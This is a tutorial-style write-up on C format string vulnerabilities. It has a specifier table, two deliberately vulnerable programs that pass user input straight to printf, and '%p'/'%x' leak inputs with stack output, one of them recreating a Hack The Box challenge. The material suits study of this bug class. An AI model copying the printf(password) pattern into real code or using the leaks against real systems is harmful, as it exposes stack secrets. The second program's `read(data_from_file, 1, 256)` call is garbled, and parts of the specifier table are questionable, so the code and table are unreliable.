# Format String Vulnerability

A **format string vulnerability** is a bug where user input is passed as the format argument to `printf`, `scanf`, or another function in that family.

The format argument has many different specifiers which could allow an attacker to leak data if they control the format argument to `printf`. Since `printf` and similar are variadic functions, they will continue popping data off of the stack according to the format.

# Common Parameters
| Format Specifier | Description                                   | Passed as   |
|------------------|-----------------------------------------------|-------------|
| `%%`             | Percent character (literal `%`)               | Reference   |
| `%p`             | External representation of a pointer          | Reference   |
| `%d`             | Signed decimal integer                        | Value       |
| `%c`             | Single character                              | Value       |
| `%u`             | Unsigned decimal integer                      | Value       |
| `%x`             | Unsigned hexadecimal integer (lowercase)      | Value       |
| `%s`             | String                                         | Reference   |
| `%n`             | Writes number of characters output so far     | Reference   |
  

# Example #1

In the example below, we can see that we have control over the `password` variable, which will be printed by `printf`.

We could use `%p` to write out the pointer addresses.

```c
#include <stdio.h>
#include <unistd.h>

int main(){

	int flag = 0xcafebabe;
	char password[256] = {0};
	
	read(0, password, 256);
	printf(password);
	printf("End of main!\n");
	
	return 0;
}
```

But as seen in the **output** below, since the flag is stored on the stack it will print it regardless.

```
%p %p %p %p %p %p %p %p %p

0x7fff120059d0 0x100 0x76d74d5147e2 0x76d74d61bf10 0x76d74d6c6040 0x2 0xcafebabe0000000e 0x7025207025207025 0x2520702520702520

End of main!
```

  

# Example #2

This is a code to simulate the Hack The Box [racecar](https://app.hackthebox.com/challenges/racecar) challenge.

In short, the code:
1. Loads *flag.txt* as `file`
2. Puts contents of `file` into `data_from_file`
3. Puts `data_from_file` onto the stack -- `buffer`
4. Asks for an input -- `password`
5. Outputs are shown and the program halts

In the actual challenge the flag was in the file and its contents were put onto the stack.
For this example *flag.txt* contains "*AAAAAA*"

```c
#include <stdio.h>

int main() {
	char password[256] = {0};
	char data_from_file[256];
	char buffer[44];
	
	FILE* file = fopen("flag.txt", "r");
	
	if (file == NULL) {
		perror("Failed to open file");
		return 1;
	}
	
	read(data_from_file, 1, 256);
	fgets(buffer, 44, file);
	
	read(0, password, 256);
	printf(password);

	printf("End of main!\n");
	return 0;
}
```

  
To leak the offset of `buffer` we did the following:
```
%x %x %x %x %x %x %x %x %x %x

7d6a3130 100 507147e2 3 1bb8b480 0 1bb8b2a0 41414141 0 ff00
```

We could now read the *A*s in hex format *(0x41)* and can note that they start at offset 8.
*The challenge was a bit more complex, this is just for demonstration purposes*
